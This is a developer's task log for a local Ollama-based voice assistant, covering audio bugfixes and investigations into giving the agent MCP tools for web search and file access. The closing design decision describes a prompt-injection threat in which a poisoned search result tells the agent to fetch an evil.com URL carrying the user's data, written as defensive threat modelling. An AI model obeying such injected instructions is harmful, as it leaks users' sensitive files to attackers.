# TODO - Basically a stand in for GitHub issues or Jira tickets

### General format:

**Task type (feature, bug, QOL, etc.) - Short description**
- **User story (if applicable)**: Why does the user want this? What must-haves is this feature supposed to come with?
- **How to reproduce (if applicable)**: How was this bug found or how can it be reproduced
- **Implementation idea(s)**: Spitball ideas for implementation/fix
- **Validation strategy**: How will this change be validated? Unit test always when applicable
- **Subtasks or related tasks**: Related or depended or dependent tasks, by name or description
- **etc.** (definition of done, or any other necessary sections)

---

# DONE

### General format:

**Task type (feature, bugfix, QOL, etc.) - Description or user story**
- **Bug Cause (if applicable)**: Short description of the bug cause found and why it happened and where
- **Implementation**: Short description about why and where
- **Validation strategy**: Short description
- **Subtasks or related tasks**: Related or depended or dependent tasks, by name or description
- **etc.** (any other necessary info)

---

**Bugfix - Setting config.INPUT_DEVICE_NAME to ATR4697 / ATR4697-USB / Ryzen threw "Invalid sample rate", but default and pipewire worked**
- **Bug Cause**: A sample-rate problem, not a wrong-device problem. Jarvis records at SAMPLE_RATE = 16000. "ATR4697" matches the raw ALSA entry `hw:0,0`, and the mic hardware only runs at 44100/48000 with no conversion layer behind a `hw:` device. "Ryzen" matches a JACK device, and the PipeWire graph is pinned to 48000. Only "default"/"pipewire" go through PipeWire, which resamples.
- **Implementation**: Stuck with None (the desktop default) for both devices, but Jarvis now prints the input and output it chose, resolving "default" through `pactl` so the line names the real microphone and speaker. `describe_device()` in jarvis/audio_devices.py, called from main.py and the `devices` manual check.
- **Validation**: Three tests in tests/test_audio_devices.py with a fake device table and a fake pactl — no hardware, no audio. Full fast suite: 30 passed.

---

**Bugfix - Jarvis would stutter when other audio was playing.**
- **Bug Cause**: PortAudio's "high" latency on this machine is only ~35 ms of buffer. sounddevice refills that buffer from a Python callback, so when something else loaded the CPU (a YouTube video) the refill missed its deadline and the speaker played the empty buffer. Affected every stream, i.e. sd.play/sd.rec in tests/manual_audio_check.py and jarvis/main.py.
- **Implementation**: Added config.AUDIO_LATENCY_SECONDS = 0.2 and set sd.default.latency from it. Chose the sounddevice global over passing latency= to each call because it is one line at each of the two entry points that touch audio, instead of the same kwarg repeated across six call sites. Set in main() in jarvis/main.py and at module level in tests/manual_audio_check.py.
- **Validation**: Run an audio source like a YouTube video and run manual_audio_check.check_tts() unit test and see that it works fine now

---

**Investigation - Find out what a locally running ollama agent can and cannot do**
- **Findings**: Ollama is an inference server, not an agent. It has no filesystem, network, or code execution of its own — it can only emit tool calls that the calling program chooses to honour. Today jarvis/ollama_llm.py passes no tools, so the answer to every question is "nothing". Everything below is about what we would be granting.
    - Filesystem: only via a tool. The official MCP filesystem server has 9 read tools and 4 write tools and NO flag to disable the writes; read-only means mounting the directory `ro` in Docker.
    - Run Python: only if we build that tool. No reference server does this on purpose. Leaving it out.
    - Financial summaries: qwen3:14b is capable enough, but Ollama defaults num_ctx to 4096 tokens and silently truncates past it — a large CSV would be cut off and summarised confidently. num_ctx must be set explicitly, and costs VRAM against our 100%-in-VRAM check.
    - Seeing the desktop: blocked twice over. qwen3:14b is text-only (needs a second vision model competing for VRAM), and this machine is Wayland/GNOME where the only installed screenshot tool (ImageMagick `import`) is X11-only. Would need the xdg-desktop-portal API, which prompts for consent by design. Hardest item on the list; deferred.
    - Internet: no, not without a tool.
    - Editing its own code: yes, trivially, if given filesystem write access to this repo. Also useless mid-run since jarvis.main is long-lived and would not reload. Do not point a write tool at the repo.
- **Validation strategy**: Ollama returns tool calls as structured data on `response.message.tool_calls`, so a fake Ollama client (like the one already in tests/test_ollama_llm.py) can assert which tool was called with which arguments. Assert on the tool call, not on the model's wording.

---

**Investigation - Give agent mcp tool access; Take a look at https://github.com/jonigl/mcp-client-for-ollama and https://github.com/patruff/ollama-mcp-bridge and the problems each solves**
- **Findings**: Use neither as a dependency.
    - patruff/ollama-mcp-bridge: last commit 2025-04-20 (~17 months stale), 22 commits total, against an MCP spec whose transports have since changed. Fails the "mature and up to date" bar. Skip. Same for mark3labs/mcphost, the other commonly recommended option — now archived.
    - jonigl/mcp-client-for-ollama: healthy (814 stars, MIT, pushed 2026-09-01), supports stdio/SSE/streamable HTTP. But it is an interactive TUI app (`ollmcp`), not a library, so it cannot be imported into jarvis/main.py. Its value is as a reference implementation and a manual test bench: `uvx ollmcp` to try MCP servers against qwen3:14b before writing any Jarvis code.
    - What we would actually build on: the official modelcontextprotocol/python-sdk (MIT, actively developed). The loop is small — Ollama's Python client takes plain functions as tools and returns tool_calls, which map onto MCP call_tool(). Roughly 60 lines, no heavy dependency.
- **Related**: Epic - Give agent access to the internet (READ-only)

---

**Investigation - Search through mcp registry (https://registry.modelcontextprotocol.io) and find the best tools today for this voice assistant**
- **Findings**: The registry is a publishing registry, not a curated quality list — the first 100 entries are mostly commercial SaaS endpoints with duplicate listings, and searching it for "search" returns Apple Search Ads before anything useful. Almost nothing targets a local, private assistant. The useful set is small:
    - Web search: ihor-sokoliuk/mcp-searxng (1.2k stars, MIT, actively developed) against a self-hosted SearXNG in Docker. Four tools, all read-only, no API key. Note its web_url_read takes an arbitrary URL — that is the exfiltration channel the two-mode split exists to close.
    - Files: official `filesystem` server with a Docker `ro` mount.
    - Also useful and safe: official `time` (genuinely handy for a voice assistant), `memory` (would replace our unbounded in-run history), `git`.
    - Rejected: Ollama's own web_search API (cloud, needs an account + API key, every query goes to ollama.com), Anthropic's web-fetch (server-side tool, only exists for models on Anthropic's API — unavailable to a local model), Brave Search MCP (API key), Firecrawl/Tavily (hosted, paid). All break the local-only premise.
- **Validation strategy**: Sandboxing must be enforced by the OS, not the prompt — run each MCP server as a systemd USER unit with IPAddressDeny=any plus an IPAddressAllow for the local SearXNG only, then assert that a fetch to an off-allowlist host fails. Prompt-level restrictions are not a boundary.

---

**Investigation - How to give the agent access to the internet (READ-only)**
- **User story**: I want to be able to ask Jarvis questions and get sourced answers from the internet if necessary. If I ask questions that the model is not trained on or cannot answer with certainty, then it should use an internet search to retrieve the answer. I want this to explicitly be read-only internet access because I also want Jarvis to have access to my filesystem (described in another task) that has sensitive info.
- **Ideas**: 
    - An mcp server exposes different tools to the agent, one of them being the ability to search the internet (SearXNG, Brave Browser, etc.)
    - Or I can implement my own fetch API (not recommended, libraries that solve the problem most likely already exist)
    - Is Claude's web-fetch available to use for an Ollama agent?
- **Validation**: Is there a way to validate that the local model has reached and used an mcp tool successfully? Or maybe ask the agent to use the tool and come back with a one word answer and assert verification on that. Is there a way to validate that the agent CANNOT write to the internet and is truly sandboxed from communicating outside its boundaries?
- **Subtasks**: Investigate what a local Ollama agent can already do, investigate mcp client for ollama and ollama mcp bridge repos to figure out what they do, investigate existing mcp tools and servers
- **Decision (from the investigations below)**: Read-only is NOT a safety boundary. Filesystem access + web search + URL fetch is the "lethal trifecta" — a poisoned search result can instruct the agent to fetch evil.com/log?d=<your data>, which is a GET and therefore "read-only" while still exfiltrating. Jarvis will have multiple modes instead, selected by a voice command at the start of the program: a web mode with no filesystem tools, and a files mode with no network tools, and maybe others down the road.